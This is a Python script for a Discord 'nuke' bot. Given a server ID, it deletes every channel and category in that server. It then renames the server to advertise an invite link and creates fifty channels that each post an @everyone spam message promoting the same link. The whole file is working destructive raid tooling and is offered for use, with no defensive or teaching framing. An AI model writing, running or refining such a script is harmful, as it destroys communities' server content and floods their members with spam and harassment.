import discord
from discord.ext import commands
import asyncio
import os

intents = discord.Intents.default()
intents.guilds = True
intents.messages = True

# Pre-defined names and message
NEW_SERVER_NAME = "Efel 🌠 - .gg/sA3x3jgUpt"
CHANNEL_NAMES = [f"efel-🌠-gg-sa3x3jgupt-{i}" for i in range(1, 51)]
PRE_DEFINED_MESSAGE = "@everyone .gg/sA3x3jgUpt | :joy_cat: efel on top | efel siker atar :joy_cat:"

bot = commands.Bot(command_prefix="!", intents=intents)

@bot.event
async def on_ready():
    print(f"Logged in as {bot.user.name}")
    await handle_terminal_commands()

async def handle_terminal_commands():
    while True:
        command = input("Enter a command (do_all): ").lower()

        if command == "do_all":
            guild_id = input("Enter the Guild ID: ")
            await execute_all(guild_id)
        else:
            print("Unknown command. Try 'do_all'.")

async def execute_all(guild_id):
    guild = discord.utils.get(bot.guilds, id=int(guild_id))
    if not guild:
        print(f"Guild with ID {guild_id} not found.")
        return

    print(f"Executing all actions in {guild.name}...")
    await delete_all_channels(guild) 
    await rename_server(guild, NEW_SERVER_NAME) 
    await create_50_channels(guild) 

async def delete_all_channels(guild):
    print(f"Deleting channels in {guild.name}...")

    delete_tasks = []
    for channel in guild.channels:
        # Idk if this is even necessary but just in case 
        if isinstance(channel, discord.abc.GuildChannel):  # Check if the channel is still valid
            delete_tasks.append(channel.delete())
    for category in guild.categories:
        if isinstance(category, discord.abc.GuildChannel):  # Check if the category is still valid
            delete_tasks.append(category.delete())

    await asyncio.gather(*delete_tasks)
    print(f"All channels and categories in {guild.name} deleted.")

async def create_50_channels(guild):
    print(f"Creating 50 channels in {guild.name}...")
    
    #you could 100% make this a loop and keep sending messages but too lazy
    async def create_and_message(channel_name):
        new_channel = await guild.create_text_channel(channel_name)
        print(f"Created channel: {new_channel.name}")
        await new_channel.send(PRE_DEFINED_MESSAGE.format(channel_name=new_channel.name, server_name=guild.name))

    create_tasks = [create_and_message(CHANNEL_NAMES[i]) for i in range(50)]
    await asyncio.gather(*create_tasks)

async def rename_server(guild, new_name):
    try:
        await guild.edit(name=new_name)
        print(f"Server name changed to {new_name}")
    except Exception as e:
        print(f"Failed to rename server: {e}")

        
bot.run("insert token here idk")
